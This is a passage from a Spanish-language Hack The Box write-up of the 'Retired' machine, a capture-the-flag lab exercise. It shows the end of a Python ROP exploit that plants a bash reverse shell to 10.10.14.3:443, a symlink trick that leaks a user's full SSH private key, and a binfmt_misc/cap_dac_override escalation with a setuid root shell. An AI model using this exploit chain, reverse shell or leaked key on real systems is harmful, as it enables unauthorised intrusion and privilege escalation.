    system = p64(libc_base + 0x00048e50)

    offset = 520

    cmd = b"bash -c 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1'"

    rop = b''
    rop += b"A"*offset


    pop_rdi = p64(active_license_base + 0x000181b) # pop rdi; ret
    pop_rsi = p64(libc_base + 0x0002890f) # pop rsi; ret
    mov_rdi_rsi = p64(libc_base + 0x000603b2) # mov [rdi], rsi; ret

    for i in range(0, len(cmd), 8):

        rop += pop_rdi
        rop += p64(writable+i)
        rop += pop_rsi
        rop += cmd[i:i+8].ljust(8, b"\x00")
        rop += mov_rdi_rsi


    rop += pop_rdi
    rop += p64(writable)
    rop += system

    with open("file.key", "wb") as f:
        f.write(rop)

    file_to_upload = {'licensefile': ("file.key", open("file.key", "rb"), 'application/x-iwork-keynote-sffkey')}

    r = requests.post(upload_url, files=file_to_upload)

if __name__ == '__main__':

    try:
        threading.Thread(target=makeExploit, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    shell.interactive()
```

nos ponemos en escucha en el puerto 443 y lanzamos el exploit.py

```console
python3 exploit.py
```

```console
sudo nc -nlvp 443
```

Una vez dentro vemos tareas que se esten ejecutando y vemos un ejecutable llamado website_backup.timer

```console
www-data@retired:/$ systemctl list-timers
```

```
NEXT                        LEFT          LAST                        PASSED       UNIT                         ACTIVATES
Sun 2022-08-28 03:39:00 UTC 27min left    Sun 2022-08-28 03:09:01 UTC 2min 1s ago  phpsessionclean.timer        phpsessionclean.service
Sun 2022-08-28 06:35:06 UTC 3h 24min left Sat 2022-08-27 12:28:22 UTC 14h ago      apt-daily-upgrade.timer      apt-daily-upgrade.service
Sun 2022-08-28 10:32:06 UTC 7h left       Sun 2022-08-28 01:33:48 UTC 1h 37min ago apt-daily.timer              apt-daily.service
Sun 2022-08-28 12:03:01 UTC 8h left       Sat 2022-08-27 12:03:01 UTC 15h ago      systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon 2022-08-29 00:00:00 UTC 20h left      Sun 2022-08-28 00:00:01 UTC 3h 11min ago logrotate.timer              logrotate.service
Mon 2022-08-29 00:00:00 UTC 20h left      Sun 2022-08-28 00:00:01 UTC 3h 11min ago man-db.timer                 man-db.service
Mon 2022-08-29 00:34:52 UTC 21h left      Sat 2022-08-27 12:15:52 UTC 14h ago      fstrim.timer                 fstrim.service
Sun 2022-09-04 03:10:33 UTC 6 days left   Sun 2022-08-28 03:10:38 UTC 24s ago      e2scrub_all.timer            e2scrub_all.service
n/a                         n/a           Sun 2022-08-28 03:11:03 UTC 12ms ago     website_backup.timer         website_backup.service

9 timers listed.
Pass --all to see loaded but inactive timers, too.
```

buscamos donde se encuentra el archivo:

```console
www-data@retired:/$ find \-name website_backup* 2>/dev/null
```

```
./etc/systemd/system/website_backup.service
./etc/systemd/system/multi-user.target.wants/website_backup.timer
./etc/systemd/system/website_backup.timer
```

Observando el archivo vemos que el usuario dev es el que está ejecutando este archivo

```console
www-data@retired:/$ cat ./etc/systemd/system/website_backup.service
```

```
[Unit]
Description=Backup and rotate website

[Service]
User=dev
Group=www-data
ExecStart=/usr/bin/webbackup

[Install]
WantedBy=multi-user.target
www-data@retired:/$ 
```

Revisamos el ejecutable y vemos que podemos aprovecharnos para obtener una copia de la carpeta home del usuario dev

```console
www-data@retired:/$ cat /usr/bin/webbackup
```

```
#!/bin/bash
set -euf -o pipefail

cd /var/www/

SRC=/var/www/html
DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"

/usr/bin/rm --force -- "$DST"
/usr/bin/zip --recurse-paths "$DST" "$SRC"

KEEP=10
/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \
    | sort --zero-terminated --numeric-sort --reverse \
    | while IFS= read -r -d '' backup; do
        if [ "$KEEP" -le 0 ]; then
            /usr/bin/rm --force -- "$backup"
        fi
        KEEP="$((KEEP-1))"
    done
```

Para obtener una copia de la carpeta home de *dev* realizamos lo siguiente

```console
ln -s -f /home/dev dev
```

Esperamos a que aparezca un nuevo backup, lo descomprimimos y adentro podemos obtener la clave privada ssh de la maquina victima

```console
www-data@retired:/tmp$ cat var/www/html/dev/.ssh/id_rsa
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
7rTyG3wbNka1sAAAALZGV2QHJldGlyZWQ=
-----END OPENSSH PRIVATE KEY-----
```

con esta llave ssh podemos tener acceso al sistema como el usuario *dev*

```console
ssh -i id_rsa dev@10.10.11.154
```

```
The authenticity of host '10.10.11.154 (10.10.11.154)' can't be established.
ECDSA key fingerprint is SHA256:WD0l0AhADq8rZtArDuKqZKdo9/a+PVnHR7PAWTRs7p4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.154' (ECDSA) to the list of known hosts.
Linux retired 5.10.0-11-amd64 #1 SMP Debian 5.10.92-2 (2022-02-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Mar 28 11:36:17 2022 from 10.10.14.23
dev@retired:~$ 
```
y ganamos acceso al sistema y podemos observar la flag de usuario

```
dev@retired:~$ cat user.txt
```

```
c6c1eb3ece343ef976d3a033ce454d38
```

## Fase de Escalación de Privilegios

Agrandamos el PATH y revisamos que capabilities tiene el usuario y vemos que tiene un binario llamado emuemu con una vulnerabilidad cap_dac_override

```console
dev@retired:~$ export PATH=/usr/lib/oracle/21/client64/bin:/home/mzapata/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/local/sbin:/usr/bin:/home/mzapata/.fzf/bin:/root/.local/bin
```

```console
dev@retired:~$ getcap -r / 2>/dev/null
```

```
/usr/bin/ping cap_net_raw=ep
/usr/lib/emuemu/reg_helper cap_dac_override=ep
```

Aprovechandonos de *bims* creamos una politica en reg_helper.c

```console
echo ":PRIVESC:E::PWNED::/tmp/shell:C" | /usr/lib/emuemu/reg_helper
```

Nos creamos el archivo que funcionará como interprete

```c
#include <unistd.h>
#include <stdio.h>

int main(void){
	setuid(0);
	setgid(0);
	system("/bin/bash");
	return 0;
}
```

Creamos el binario shell

```console
dev@retired:/tmp$ gcc shell.c -o shell
```

buscamos que binario esta corriendo como root

```console
dev@retired:/tmp$ find / -perm -4000 -user root 2>/dev/null
```

```
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

Creamos un enlace simbólico a uno de estos archivos

```console
dev@retired:/tmp$ ln -s -f /usr/bin/mount mount.PWNED
```

Ejecutamos este enlace simbolico nuevo y nos otorga acceso de root

```console
dev@retired:/tmp$ ./mount.PWNED 
```

y ya podemos ver la flag de root

```console
root@retired:/tmp# cat /root/root.txt 
```

```
81d5c9a627962e377e201cc4f8215a47
```

## Estructura del directorio

```
Retired
```


